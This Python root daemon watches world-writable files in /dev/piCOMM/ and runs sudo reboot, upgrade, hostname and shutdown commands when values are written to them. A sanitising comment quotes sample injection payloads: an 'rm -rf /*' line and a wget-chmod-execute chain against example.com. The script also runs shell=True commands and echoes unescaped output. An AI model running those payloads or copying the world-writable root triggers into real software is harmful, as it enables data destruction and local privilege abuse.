import sys
import os
import time
import subprocess
import logging
from watchdog.observers import Observer
from watchdog.events import LoggingEventHandler, PatternMatchingEventHandler
from logging.handlers import RotatingFileHandler
import re

LOGFILE = "/home/ceadmin/RTA/logs/commlog.txt"
STATUSDIR = "/dev/piCOMM/"
global_logger = None
cmd_template = {
    "example": {
        "default": "terminal command to write default value to this file ",
        "change-to": " a string we want to monitor the change to, or 'any'",
        "cmd": "command to execute, with '$any$' to replace the read value if above supports it",
        "response": "command who's 1st line generates a response, or an empty string for below",
        "response-index": "an int index for the line of output of cmd to print as a response, ",
    }
}
commands = {
    "restart": {
        "default": "echo 0",
        "change-to": "1",  # "any" is reserved, means read the file, monitor for changes from last value, then $any$ can be used to replace in cmd
        "cmd": "sudo shutdown -r 0",
        "response": 'echo "restarting now"',  # command to generate response or ''
        "response-index": 0,  # index of output of command to send as a response if "response" is ''
    },
    "update": {
        "default": "echo 0",
        "change-to": "1",
        "cmd": "sudo DEBIAN_FRONTEND=noninteractive apt-get update && sudo DEBIAN_FRONTEND=noninteractive apt-get upgrade -y",
        "response": "",
        "response-index": -1,
    },
    "hostname": {
        "default": "sudo hostnamectl hostname",
        "change-to": "any",
        "cmd": "sudo hostnamectl hostname $any$",
        "response": "sudo hostnamectl hostname",
        "response-index": 0,
    },
    "shutdown": {
        "default": "echo 0",
        "change-to": "1",
        "cmd": "sudo shutdown 0",
        "response": 'echo "shutting down now"',
        "response-index": 0,
    },
}


def check_root():
    return not os.geteuid()


def execcmd(command):
    global_logger.debug(command)
    ret = (
        subprocess.check_output(command, shell=True)
        .decode("utf-8")
        .rstrip("\n")
        .split("\n")
    )
    global_logger.debug(ret)
    return ret


def verify_commands(logger):
    global commands
    logger.info("Verifying commands...")

    class UnpopulatedParam(Exception):
        pass

    class MissingAnyKeyword(Exception):
        pass

    rem_list = []
    for cmd in commands:
        try:
            # check all keys exist
            for key in cmd_template["example"]:
                x = commands[cmd][key]  # will raise key error if fails
                if key != "response" and key != "response-index" and (not x):
                    logger.info(f"{key} parameter must be populated in {cmd}")
                    raise UnpopulatedParam
                if key == "change-to" and commands[cmd]["change-to"] == "any":
                    command = commands[cmd]["cmd"].replace("$any$", "test")
                    if command == commands[cmd]["cmd"]:  # no change happened
                        raise MissingAnyKeyword
                if key == "response" and not x:
                    index = int(
                        commands[cmd]["response-index"]
                    )  # will raise ValueError if fails
            continue  # to next command
        except KeyError:
            logger.critical(
                f"{cmd} has a keyvalue error, make sure all keys from template are included, removing..."
            )
        except ValueError:
            logger.critical(
                f"{cmd} has a ValueError, make sure 'response-index' is an int, removing..."
            )
        except UnpopulatedParam:
            logger.critical(f"{cmd} has a Unpopulated key error, removing...")
        except MissingAnyKeyword:
            logger.critical(
                f"{cmd} is missing '$any' token in 'cmd' when 'change-to' is 'any', removing..."
            )
        except:
            logger.critical(f"{cmd} has an exception, removing...")
        rem_list.append(cmd)
    if rem_list:
        for x in rem_list:
            del commands[x]


def make_filestructure(logger):
    global commands
    if not os.path.isdir(STATUSDIR):
        os.mkdir(STATUSDIR, mode=0o777)

    for command in commands:
        with open(os.path.join(STATUSDIR, command), "w") as f:
            default = execcmd(commands[command]["default"])[0]
            f.write(default)
            commands[command]["last_val"] = default
        with open(os.path.join(STATUSDIR, command + "-response"), "w") as f:
            pass
    os.system(f"sudo chmod -R +777 {os.path.normpath(STATUSDIR)}")

    arr = []
    lls(STATUSDIR, arr)
    print(arr)
    logger.info(f"Created driver structure:")
    for f in arr:
        logger.info(f)


def lls(path, arr=[]):
    path = os.path.normpath(path)
    if os.path.isfile(path):
        arr.append(path)
    elif os.path.isdir(path):
        arr.append(path)
        for f in os.listdir(path):
            lls(os.path.join(path, f), arr)
    return arr


def shutdown(logger, observer):
    # cleanup gpios
    observer.stop()
    observer.join
    logger.info("shutting down")
    logger.handlers.clear()
    # logger.shutdown()


def start_watchdog(logger):
    class Handler(PatternMatchingEventHandler):
        def __init__(self):
            PatternMatchingEventHandler.__init__(
                self,
                patterns=[f"*/{cmdname}" for cmdname in commands],
                ignore_directories=True,
            )
            self.lock = []
            self.line = 0

        def on_modified(self, event):
            global commands
            self.line = 0
            if os.path.normpath(event.src_path) not in self.lock:
                self.lock.append(os.path.normpath(event.src_path))
                try:
                    self.line = 1
                    logger.info(f"New event on {event.src_path}")
                    self.line = 2
                    cmdname = os.path.split(event.src_path)[-1]
                    self.line = 3
                    logger.info(f"Previously: {commands[cmdname]['last_val']}")
                    self.line = 4
                    with open(event.src_path, "r") as f:
                        self.line = 4
                        val = (
                            f.readline().strip("\n").rstrip()
                        )  # this assumes only one line will be written to this file
                        self.line = 5
                        logger.info("written val: " + val)
                        self.line = 6
                        if val == commands[cmdname]["last_val"]:  # do nothing
                            self.line = 7
                            logger.info(f"No change detected, not doing anything")
                            # execcmd(
                            #    f"echo 'no change detected' > {os.path.join(STATUSDIR,cmdname+'-response')}"
                            # )
                            self.line = 8
                            self.lock.remove(os.path.normpath(event.src_path))
                            return
                        elif not commands[cmdname]["change-to"] == "any":
                            self.line = 9
                            print("Change-to is not any")
                            self.line = 10
                            if not val == commands[cmdname]["change-to"]:
                                self.line = 11
                                print(commands[cmdname]["last_val"])
                                print(os.path.join(STATUSDIR, cmdname))
                                print("val is not change-to")
                                self.line = 12
                                logger.info(
                                    f'Invalid value written to {os.path.join(STATUSDIR,cmdname)}: {val}, reverting to {commands[cmdname]["last_val"]}'
                                )
                                self.line = 13
                                execcmd(
                                    f'echo "{commands[cmdname]["last_val"]}">{os.path.join(STATUSDIR,cmdname)} '
                                )
                                self.line = 14
                                self.lock.remove(os.path.normpath(event.src_path))
                                return
                            else:
                                self.line = 15
                                print("else")
                                logger.info(
                                    f'Valid value written to {os.path.join(STATUSDIR,cmdname)}: {val}, executing {commands[cmdname]["cmd"]}'
                                )
                                self.line = 16
                                response = execcmd(commands[cmdname]["cmd"])
                        else:  # val change-to is any then
                            self.line = 17
                            # sanitize user input before executing it in bash
                            # goal: allow only alphanumeric and spaces, and convert spaces to underscores
                            clean = str(val).replace("_", "")
                            clean = clean.replace(" ", "_")
                            clean = re.sub("[^a-zA-Z0-9_]", "", clean)
                            clean = f'"{clean}"'
                            # ";rm -rf /*" ->'"rm_rf_"'
                            # ";$(wget example.com/malicious_script.sh; chmod +777 malicious_script.sh; ./malicious_script.sh)"->
                            # '"wget_examplecommaliciousscriptsh_chmod_777_maliciousscriptsh_maliciousscriptsh"'
                            command = commands[cmdname]["cmd"].replace("$any$", clean)
                            self.line = 18
                            logger.info(
                                f"'{val}'  written to {os.path.join(STATUSDIR,cmdname)}, executing {command}"
                            )
                            self.line = 19
                            response = execcmd(command)
                        self.line = 20
                        [logger.info(f"Response: {r}") for r in response]
                        self.line = 21
                        if not commands[cmdname]["response"]:
                            self.line = 22
                            index = int(commands[cmdname]["response-index"])
                            if index >= len(response) or index <= -len(response):
                                index = -1
                            print_response = response[index]
                        else:
                            self.line = 23
                            print_response = execcmd(commands[cmdname]["response"])[0]
                        self.line = 24
                        execcmd(
                            f'echo "{print_response}">{os.path.join(STATUSDIR,cmdname+"-response")}'
                        )
                        self.line = 25
                        logger.info(
                            f"'{print_response}' written to {os.path.join(STATUSDIR,cmdname+'-response')}"
                        )
                        self.line = 26
                        # write back default to last val and to file
                        default = execcmd(commands[cmdname]["default"])[0]
                        self.line = 27
                        commands[cmdname][
                            "last_val"
                        ] = default  # update last_val before writing file because it will trigger a new event
                        self.line = 28
                        logger.info(f"{default=}")
                        echoline = (
                            f'echo "{default}">{os.path.join(STATUSDIR, cmdname)}'
                        )
                        self.line = 28.5
                        logger.info(f"{echoline=}")
                        execcmd(echoline)
                        self.line = 29
                        logger.info(f"new val:{commands[cmdname]['last_val']}")
                except:
                    logger.critical(f"process crashed on {self.line=} managing {event}")

                self.lock.remove(os.path.normpath(event.src_path))
            else:
                logger.info(
                    f"Called while an event was happening on {(os.path.normpath(event.src_path))}"
                )

    event_handler = Handler()
    observer = Observer()
    observer.schedule(event_handler, path=STATUSDIR, recursive=False)
    observer.start()
    return observer


def main():
    # first verify log directory and start logger
    log_dir, _ = os.path.split(LOGFILE)
    if not os.path.isdir(log_dir):
        os.system(f"mkdir -p {log_dir}")  # os.mkdir(log_dir, mode=0o666)
        os.system(f"sudo chmod -R +777 {log_dir}")

    logger = logging.getLogger("Rotating Logger")
    logger.setLevel(logging.DEBUG)
    handler = logging.handlers.RotatingFileHandler(
        LOGFILE, "a", maxBytes=65500, backupCount=5
    )
    formatter = logging.Formatter(
        "%(asctime)s, %(msecs)d %(levelname)s - %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    global global_logger
    global_logger = logger

    logger.info("Started process.")
    if check_root():
        logger.info("User is root")
    else:
        logger.critical("User is not root, terminating...")
        return
    verify_commands(logger)
    make_filestructure(logger)
    observer = start_watchdog(logger)
    try:
        while True:
            time.sleep(5)
    except:
        shutdown(logger, observer)


if __name__ == "__main__":
    print("Starting commands driver.")
    main()
